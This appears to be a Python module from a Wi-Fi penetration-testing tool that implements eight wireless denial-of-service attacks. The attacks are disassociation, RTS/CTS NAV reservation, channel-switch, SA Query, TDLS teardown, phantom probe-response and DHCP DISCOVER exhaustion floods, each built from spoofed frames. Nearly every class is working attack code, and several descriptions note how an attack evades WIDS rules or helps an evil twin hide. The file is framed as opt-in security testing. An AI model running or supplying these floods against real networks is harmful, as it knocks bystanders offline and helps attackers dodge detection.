# SPDX-License-Identifier: Apache-2.0 OR BSD-3-Clause
"""Eight more denial-of-service tests, all built in-process.

``flood2`` covered the state-exhaustion family; these are the ones that abuse the
*medium* and the *protocol state machine*:

* ``disassoc_flood`` — disassociation frames (deauth's sibling, often not in the same
  WIDS rule set).
* ``rts_flood`` / ``cts_flood`` — RTS and CTS-to-self frames with a maximal NAV
  duration: the medium is reserved for a station that never transmits, so nothing else
  can.  No management frame, no deauth, and quite invisible to rules that count them.
* ``channel_switch_flood`` — repeated channel-switch announcements: clients follow the
  AP to a channel that then goes quiet.
* ``sa_query_flood`` — SA Query requests to a PMF AP: every one makes the AP consult
  association state it must keep for the check to work.
* ``tdls_teardown_flood`` — TDLS Teardown frames: stations with a direct link are told
  to drop it, repeatedly.
* ``probe_response_flood`` — answers to probe requests from BSSIDs that do not exist,
  which poisons every client's scan list with phantom networks.
* ``dhcp_discover_flood`` — DHCP DISCOVERs from thousands of fake stations: a DHCP
  server (or the AP's relay) allocates state per attempt.

All eight are opt-in, time-capped, and report the finding rather than a password.
"""

from __future__ import annotations

from typing import Sequence

from ..netproto import dhcp_discover, ipv4_udp_packet
from ..rawtx import (build_cts, build_csa_beacon, build_data, build_disassoc,
                     build_probe_response, build_rts,
                     build_sa_query, build_tdls_teardown, spoofed_mac)
from .flood2 import _FrameFlood

ALL = ("WPA", "WPA2", "WPA2/WPA3", "WPA3", "WEP", "OPEN", "OWE", "WPA-ENTERPRISE",
       "WPA2-ENTERPRISE", "ENTERPRISE")


class DisassocFloodAttack(_FrameFlood):
    name = "disassoc_flood"
    label = "Disassociation flood"
    tool = "wifipilot rawtx.py (disassociation frames)"
    description = ("Disassociate every station, repeatedly.  It is a deauth flood with a "
                   "different frame type, which matters for one operational reason: many "
                   "WIDS rule sets alert on deauth frames specifically, and this one "
                   "arrives as a normal-looking disassociation.  The test question is "
                   "whether the site's monitoring sees it.")
    category = "dos"
    noise = "extreme"
    impact = "outage"
    max_seconds = 30.0
    demo_rate = 1800
    warning = "every client of the AP is disconnected, repeatedly"
    finding_title = "Disassociation flood delivered"
    finding_detail = ("Broadcast disassociation frames were sent in a loop; the finding "
                      "is whether anything noticed, and whether clients fell back to a "
                      "different network")
    deliverable = "the detection finding, not a password"

    def frames(self, ctx, ap, round_index: int) -> Sequence[bytes]:
        victim = ""
        if ap.clients and round_index % 3:
            victim = sorted(ap.clients)[round_index % len(ap.clients)]
        return [build_disassoc(ap.bssid, victim or "ff:ff:ff:ff:ff:ff", reason=8)]


class RtsFloodAttack(_FrameFlood):
    name = "rts_flood"
    label = "RTS/NAV flood (medium reservation)"
    tool = "wifipilot rawtx.py (RTS frames)"
    description = ("Send request-to-send frames whose duration field reserves the medium "
                   "for the longest legal time, to addresses that will never answer.  "
                   "Every station that hears an RTS and is not the addressee stays quiet "
                   "for the reserved period, so the channel is held by nobody.  There is "
                   "no management frame involved, which is exactly why it is worth "
                   "testing for.")
    category = "dos"
    noise = "extreme"
    impact = "degraded"
    max_seconds = 30.0
    demo_rate = 3000
    warning = ("the channel is reserved but never used: every station in range "
               "waits, and throughput collapses")
    finding_title = "RTS/NAV reservation flood delivered"
    finding_detail = ("RTS frames with a maximal duration were sent; stations that do "
                      "not answer them still honour the reservation")
    deliverable = "the detection finding (does the site meter medium reservation?)"

    def frames(self, ctx, ap, round_index: int) -> Sequence[bytes]:
        transmitter = spoofed_mac(round_index * 7 + 3)
        return [build_rts(transmitter, ap.bssid, duration=32767),
                build_rts(transmitter, "ff:ff:ff:ff:ff:ff", duration=32767)]


class CtsFloodAttack(_FrameFlood):
    name = "cts_flood"
    label = "CTS-to-self flood (quiet NAV attack)"
    tool = "wifipilot rawtx.py (CTS frames)"
    description = ("CTS-to-self is the quietest way to hold a channel: one short control "
                   "frame that tells every station to stay silent for its duration, "
                   "attributed to nobody in particular.  Repeated at full rate it "
                   "replaces the channel with silence, and a WIDS looking for deauths "
                   "or management frames sees nothing at all.")
    category = "dos"
    noise = "extreme"
    impact = "degraded"
    max_seconds = 30.0
    demo_rate = 3200
    warning = "the channel is silenced frame by frame; only control frames are on air"
    finding_title = "CTS-to-self flood delivered"
    finding_detail = ("CTS-to-self frames with a maximal duration were sent: the medium "
                      "is reserved continuously and no data can be sent")
    deliverable = "the detection finding (is medium reservation monitored at all?)"

    def frames(self, ctx, ap, round_index: int) -> Sequence[bytes]:
        return [build_cts(spoofed_mac(round_index * 11 + 5), duration=32767)]


class ChannelSwitchFloodAttack(_FrameFlood):
    name = "channel_switch_flood"
    label = "Channel-switch flood (clients chase a quiet channel)"
    tool = "wifipilot rawtx.py (CSA beacons)"
    description = ("Announce a channel switch, then another, then another.  Clients that "
                   "honour the announcement move to the announced channel — and if we "
                   "never transmit there, they have left a working network for an empty "
                   "one.  The frames are beacons with a CSA element, not deauths, and a "
                   "station that ignores them is the correct behaviour and is reported "
                   "as such.")
    category = "dos"
    noise = "loud"
    impact = "outage"
    max_seconds = 30.0
    demo_rate = 900
    warning = ("clients that follow the announcements leave the channel: they lose "
               "connectivity until they decide to come back")
    finding_title = "Channel-switch announcements delivered"
    finding_detail = ("Beacons carrying channel-switch announcements were sent in a "
                      "loop; a client that follows them is off the network")
    deliverable = "the finding (does anything validate CSA frames?)"

    def frames(self, ctx, ap, round_index: int) -> Sequence[bytes]:
        channel = ap.channel or 6
        target = 1 if channel != 1 else 11
        return [build_csa_beacon(ap.bssid, ap.essid or "csa", channel=channel,
                                 new_channel=target)]


class SaQueryFloodAttack(_FrameFlood):
    name = "sa_query_flood"
    label = "SA Query flood (PMF association state)"
    tool = "wifipilot rawtx.py (SA Query action frames)"
    description = ("SA Query is how a PMF access point checks that a station still holds "
                   "its association.  Sending the requests at rate makes the AP walk its "
                   "association table for every one of them, and the token field means "
                   "it has to remember each exchange.  The frames are *protected-capable* "
                   "action frames, so the test also shows whether the AP answers "
                   "unauthenticated SA Queries at all.")
    category = "dos"
    noise = "loud"
    impact = "degraded"
    max_seconds = 30.0
    demo_rate = 700
    warning = "the AP's association-state machine is exercised at frame rate"
    finding_title = "SA Query flood delivered"
    finding_detail = ("SA Query requests with rotating tokens were sent: every one is a "
                      "lookup the AP has to answer")
    deliverable = "the finding (does the AP rate-limit SA Query?)"

    def applies(self, ap) -> bool:
        return bool(ap.pmf or ap.sae or not ap.pmf_checked)

    def frames(self, ctx, ap, round_index: int) -> Sequence[bytes]:
        station = spoofed_mac(round_index * 13 + 7)
        return [build_sa_query(ap.bssid, station, token=round_index & 0xFFFF,
                               protected=False)]


class TdlsTeardownFloodAttack(_FrameFlood):
    name = "tdls_teardown_flood"
    label = "TDLS teardown flood (direct links dropped)"
    tool = "wifipilot rawtx.py (TDLS action frames)"
    description = ("TDLS lets two stations talk directly.  The teardown frame that ends "
                   "such a link is a management action frame addressed to one station "
                   "and claiming to come from another, and it needs no cryptographic "
                   "protection unless PMF is enforced.  Flooding it breaks every direct "
                   "link on the channel and pushes the traffic back through the AP, "
                   "which is either a denial of service or a way to force traffic where "
                   "it can be observed — the report says which.")
    category = "dos"
    noise = "loud"
    impact = "degraded"
    max_seconds = 30.0
    demo_rate = 800
    warning = "direct station-to-station links are torn down repeatedly"
    finding_title = "TDLS teardown flood delivered"
    finding_detail = ("TDLS Teardown action frames were sent; stations with direct links "
                      "drop them and fall back to the AP")
    deliverable = "the finding (are action frames validated?)"

    def frames(self, ctx, ap, round_index: int) -> Sequence[bytes]:
        first = spoofed_mac(round_index * 5 + 1)
        second = spoofed_mac(round_index * 5 + 2)
        return [build_tdls_teardown(ap.bssid, first, peer=second, reason=3),
                build_tdls_teardown(ap.bssid, second, peer=first, reason=3)]


class ProbeResponseFloodAttack(_FrameFlood):
    name = "probe_response_flood"
    label = "Probe response flood (phantom scan lists)"
    tool = "wifipilot rawtx.py (probe responses)"
    description = ("Answer probe requests from BSSIDs that do not exist, with SSIDs the "
                   "client has never asked for.  Every answer lands in the client's scan "
                   "list, and a station that 'sees' forty networks where there are three "
                   "has a different opinion about its neighbourhood — which is how a "
                   "twin hides in plain sight afterwards.")
    category = "dos"
    noise = "loud"
    impact = "degraded"
    max_seconds = 30.0
    demo_rate = 1200
    warning = "clients' scan lists fill with networks that do not exist"
    finding_title = "Probe responses with phantom BSSIDs delivered"
    finding_detail = ("Probe responses from non-existent BSSIDs were sent to every "
                      "station that probed, filling scan lists and hiding the real "
                      "neighbourhood")
    deliverable = "the finding (does anything spot phantom BSSIDs?)"

    def frames(self, ctx, ap, round_index: int) -> Sequence[bytes]:
        station = next(iter(sorted(ap.clients)), "ff:ff:ff:ff:ff:ff")
        phantom = spoofed_mac(round_index * 17 + 9)
        names = [ap.essid or "FreeWiFi", "FreeWiFi", "Guest", "eduroam", "CoffeeShop"]
        return [build_probe_response(station, phantom,
                                     names[round_index % len(names)],
                                     channel=ap.channel or 6)]


class DhcpDiscoverFloodAttack(_FrameFlood):
    name = "dhcp_discover_flood"
    label = "DHCP DISCOVER flood (lease pool exhaustion)"
    tool = "wifipilot netproto.py + rawtx.py (UDP broadcast)"
    description = ("Broadcast DHCP DISCOVERs from thousands of fake stations.  Whether "
                   "or not a server answers, every DISCOVER is state: a handler that "
                   "remembers the transaction ID, a relay that forwards it, a pool that "
                   "reserves an address for a while.  A real DHCP server can be walked "
                   "through its whole pool this way, and the finding is how long it "
                   "takes to stop answering.")
    category = "dos"
    noise = "loud"
    impact = "degraded"
    max_seconds = 30.0
    demo_rate = 1400
    warning = ("the network's DHCP service is worked through its pool; clients that "
               "ask for a lease while this runs may not get one")
    finding_title = "DHCP DISCOVER flood delivered"
    finding_detail = ("DHCP DISCOVER broadcasts from fake stations were sent: the "
                      "server's lease pool and transaction state are the resource")
    deliverable = "the finding (does the pool recover, and how fast?)"

    def frames(self, ctx, ap, round_index: int) -> Sequence[bytes]:
        station = spoofed_mac(round_index * 19 + 4)
        payload = ipv4_udp_packet("0.0.0.0", "255.255.255.255", 68, 67,
                                  dhcp_discover(station, vendor_class="MSFT 5.0"),
                                  ttl=64, buf_id=round_index)
        return [build_data(ap.bssid, "ff:ff:ff:ff:ff:ff", payload,
                           to_ds=False, from_ds=True)]


__all__ = ["ChannelSwitchFloodAttack", "CtsFloodAttack", "DhcpDiscoverFloodAttack",
           "DisassocFloodAttack", "ProbeResponseFloodAttack", "RtsFloodAttack",
           "SaQueryFloodAttack", "TdlsTeardownFloodAttack"]
